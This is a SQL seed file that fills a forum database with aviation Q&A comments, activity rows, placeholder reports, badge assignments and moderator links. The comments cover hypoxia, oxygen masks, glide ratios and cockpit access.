INSERT INTO postinstance (post_id, user_id, description) VALUES (234, 11, '&amp;quot;&lt;i&gt;The cargo hold is indeed vacuumed, using a vacuum cleaner&lt;/i&gt;&amp;quot;. That&amp;#39;s right, when this is done in flight, the technicians and the vacuum cleaner enter the hold in a &lt;a href=&quot;https://i.stack.imgur.com/QNFnH.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;special pressurized container which opens only in cruise phase&lt;/a&gt;.');
INSERT INTO answercomment (post_id, answer_id) VALUES (234, 206);
INSERT INTO activity (post_id, user_id, action) VALUES (234, 11, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (235, 15, '@Chris Stratton The CO2 would not increase. That&amp;#39;s what makes hypoxia so insidious. Your brain does not register a lack of oxygen in the blood, rather it registers an excess of CO2. That&amp;#39;s what gives you the uncomfortable suffocating/drowning feeling when you can&amp;#39;t breathe. But if you can still eliminate CO2 you won&amp;#39;t know anything is wrong until you start getting confused, etc. I&amp;#39;ve read that sometimes people find it pleasurable, like being drunk or high.');
INSERT INTO answercomment (post_id, answer_id) VALUES (235, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (235, 15, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (236, 21, '@David Glickman The CVR only recorded the last 30 min of the flight and the F16 intercept did not arrive until 2 hours after the last contact with the pilots. So we don&amp;#39;t know what the cabin crew may have done during that period of time. The FDR does not register the operation of the intercom or the cockpit door. It&amp;#39;s quite possible the FA&amp;#39;s may have tried to call the pilots or entered the cockpit earlier. They may have tried calling ATC for help. The report says that when the FA tried to call mayday it did not go out over VHF, so he was probably not familiar with how to operate the radio.');
INSERT INTO answercomment (post_id, answer_id) VALUES (236, 217);
INSERT INTO activity (post_id, user_id, action) VALUES (236, 21, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (236, 21, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (237, 39, 'Totally agree. I just put in a 7:1 glide ratio, and will use the feature as one more tool in the event of an emergency.');
INSERT INTO answercomment (post_id, answer_id) VALUES (237, 213);
INSERT INTO activity (post_id, user_id, action) VALUES (237, 39, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (238, 31, 'If I&amp;#39;m reading the chart correctly, the glide ratio varies with the ambient air temperature.  Therefore a standard glide ratio is not going to apply here.  I would be hesitant to trust your life to this ForeFlight feature and instead rely on a thorough examination and learn the the numbers from this chart instead of trying to create a uniform glide ratio for the airplane.');
INSERT INTO answercomment (post_id, answer_id) VALUES (238, 213);
INSERT INTO activity (post_id, user_id, action) VALUES (238, 31, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (239, 28, 'Really thank you for the detailed information. Could you please explain the distance precision for whole path? e.g. aaaa nm or aaaa.aa nm?');
INSERT INTO answercomment (post_id, answer_id) VALUES (239, 218);
INSERT INTO activity (post_id, user_id, action) VALUES (239, 28, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (240, 41, 'Fantastic answer. Thanks.');
INSERT INTO answercomment (post_id, answer_id) VALUES (240, 207);
INSERT INTO activity (post_id, user_id, action) VALUES (240, 41, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (241, 13, 'Thanks all, especially for the ICAO reference!');
INSERT INTO answercomment (post_id, answer_id) VALUES (241, 226);
INSERT INTO activity (post_id, user_id, action) VALUES (241, 13, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (242, 4, 'I couldn&amp;#39;t understand the problem with using ECEF. You have to use ellipsoidal height (Hmsl+Hgeoid) along with other parameters to calculate the 3D position of an aircraft. You&amp;#39;re right that straight-line distances will be calculated but in the air not on ground or on a reference surface (sphere or ellipsoid). The distances are calculated on a reference surface not on the ground in fact. Let&amp;#39;s assume the difference between ellipsoidal and spherical calculation method is about several nautical miles. Will you ignore this difference?');
INSERT INTO answercomment (post_id, answer_id) VALUES (242, 209);
INSERT INTO activity (post_id, user_id, action) VALUES (242, 4, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (243, 24, 'The mask trigger pressure is a pressure I can breathe at for hours; however 40000 feet not so much. It really does depend on how high the plane is.');
INSERT INTO answercomment (post_id, answer_id) VALUES (243, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (243, 24, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (244, 48, '@DRF Cockpit doors have codes to request entry from outside, and the flight attendants know the code. The flight crew can deny entry (which is why the captain couldn&amp;#39;t reenter the cockpit on that Germanwings flight), but if they don&amp;#39;t respond to the request, the door unlocks.');
INSERT INTO answercomment (post_id, answer_id) VALUES (244, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (244, 48, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (245, 27, 'If you are breathing off of a cabin mask, you are breathing at altitude, and you can hold your breath at that pressure absent climbs or descents, but the amount of available oxygen would be reduced and the partial pressure of CO2 would presumably build abnormally quickly, so you could only do so for a reduced amount of time compared to at sea level.');
INSERT INTO answercomment (post_id, answer_id) VALUES (245, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (245, 27, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (246, 20, 'welcome to aviation.SE. if possible, we prefer autoritative sources, not &amp;quot;a guy told me&amp;quot;. If you could find some sources to back up your answer it would improve substantially.');
INSERT INTO answercomment (post_id, answer_id) VALUES (246, 214);
INSERT INTO activity (post_id, user_id, action) VALUES (246, 20, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (247, 38, 'Thanks, I updated my question with the graph I think you&amp;#39;re mentioning, and the ForeFlight box to give some context of why I&amp;#39;m trying to find the glide slope.');
INSERT INTO answercomment (post_id, answer_id) VALUES (247, 213);
INSERT INTO activity (post_id, user_id, action) VALUES (247, 38, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (248, 43, 'I&amp;#39;d emphasise that last point. No quicker way to fail your test than using the wrong one.');
INSERT INTO answercomment (post_id, answer_id) VALUES (248, 224);
INSERT INTO activity (post_id, user_id, action) VALUES (248, 43, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (249, 40, 'interesting, ill remove that section.');
INSERT INTO answercomment (post_id, answer_id) VALUES (249, 216);
INSERT INTO activity (post_id, user_id, action) VALUES (249, 40, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (250, 14, 'The pilot did not regain conciousness, it was a flight attendant named Andreas Prodromou with a commercial pilots license (not rated for that aircraft) that was sitting in the pilots seat.');
INSERT INTO answercomment (post_id, answer_id) VALUES (250, 216);
INSERT INTO activity (post_id, user_id, action) VALUES (250, 14, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (251, 44, '@FreeMan: Sure, but of course if it&amp;#39;s not a large/busy airport (by my standards, anyway), it&amp;#39;s not going to have a control tower.  Maybe not even Unicom :-)  But I got pretty good at keeping to cruise speed (which in a Cherokee isn&amp;#39;t all that fast :-)) until on short final, then doing a slip and touching down at the right distance to hit the first taxiway.');
INSERT INTO answercomment (post_id, answer_id) VALUES (251, 226);
INSERT INTO activity (post_id, user_id, action) VALUES (251, 44, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (252, 27, 'I agree that he was a pilot, but why did he wait until the fuel was exhausted before entering the cockpit? Maybe he didn&amp;#39;t know that he should act quickly?');
INSERT INTO answercomment (post_id, answer_id) VALUES (252, 217);
INSERT INTO activity (post_id, user_id, action) VALUES (252, 27, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (253, 16, '@njzk2 You need to, otherwise there will be a reverse process in the lungs and the blood will loose oxygen very quickly. But you will not die that fast at 40000ft. You will die if the pilot is incapacitated and you crash, but not from the lack of oxygen in 30 seconds. Not at that height.');
INSERT INTO answercomment (post_id, answer_id) VALUES (253, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (253, 16, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (254, 21, '@PeterMasiar you don&amp;#39;t really need to have air in your lungs to hold your breath.');
INSERT INTO answercomment (post_id, answer_id) VALUES (254, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (254, 21, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (255, 44, '@njzk2 - you cannot hold your breath. You need to exhale. Pressure outside of your body is so low that your lungs might be damaged [citation needed].');
INSERT INTO answercomment (post_id, answer_id) VALUES (255, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (255, 44, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (255, 44, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (256, 1, 'Lol. I didn&amp;#39;t watch past the first minute or so. Wanted to see if they really used bolts on the fuselage. That&amp;#39;s a helluva riveting machine!  +1 btw');
INSERT INTO answercomment (post_id, answer_id) VALUES (256, 227);
INSERT INTO activity (post_id, user_id, action) VALUES (256, 1, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (257, 6, '@njzk2 because in this case people aren&amp;#39;t holding their breath. It&amp;#39;s like asking why do people drown if they breathe in water even though they can hold their breath for a minute or two.');
INSERT INTO answercomment (post_id, answer_id) VALUES (257, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (257, 6, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (258, 30, 'but most people can hold their breathe for more than 30 seconds. how come you loose consciousness so fast?');
INSERT INTO answercomment (post_id, answer_id) VALUES (258, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (258, 30, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (259, 50, '@VladimirF If cabin altitude reaches about 38000 feet you are incapacitated after ~15 secs, and you will die 100% without help of somebody else. But I see your point and edited the sentence');
INSERT INTO answercomment (post_id, answer_id) VALUES (259, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (259, 50, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (260, 15, '@DRF I&amp;#39;m really unsure at all, but I think the purser has the code to open the door.');
INSERT INTO answercomment (post_id, answer_id) VALUES (260, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (260, 15, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (261, 29, 'Thanks a lot for the tip! Didn&amp;#39;t notice it wasn&amp;#39;t clear enough.');
INSERT INTO answercomment (post_id, answer_id) VALUES (261, 221);
INSERT INTO activity (post_id, user_id, action) VALUES (261, 29, 'Create');

INSERT INTO report (post_id, user_id, title, content, reason) VALUES (121, 9, 'test report', 'i do not think this kind of post belongs here', 'offensive');
INSERT INTO report (post_id, user_id, title, content, reason) VALUES (130, 39, 'i do not like this post one bit', 'i do not think this kind of post belongs here', 'offensive');
INSERT INTO report (post_id, user_id, title, content, reason) VALUES (43, 31, 'i do not like this post one bit', 'i do not think this kind of post belongs here', 'offensive');
INSERT INTO report (post_id, user_id, title, content, reason) VALUES (35, 8, 'test report', 'i do not think this kind of post belongs here', 'off-topic');
INSERT INTO report (post_id, user_id, title, content, reason) VALUES (72, 30, 'this post is off-topic', 'not the first time this user has done it', 'other');

INSERT INTO useraccbadge (user_id, badge_id) VALUES (1, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (2, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (3, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (4, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (5, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (6, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (7, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (8, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (9, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (10, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (11, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (12, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (13, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (14, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (15, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (16, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (17, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (18, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (19, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (20, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (21, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (22, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (23, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (24, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (25, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (26, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (27, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (28, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (29, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (30, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (31, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (32, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (33, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (34, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (35, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (36, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (37, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (38, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (39, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (40, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (41, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (42, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (43, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (44, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (45, 2);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (46, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (47, 3);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (48, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (49, 1);
INSERT INTO useraccbadge (user_id, badge_id) VALUES (50, 1);

INSERT INTO topicuseracc (mod_id, topic_id) VALUES (2, 1);
INSERT INTO topicuseracc (mod_id, topic_id) VALUES (2, 2);
INSERT INTO topicuseracc (mod_id, topic_id) VALUES (3, 3);
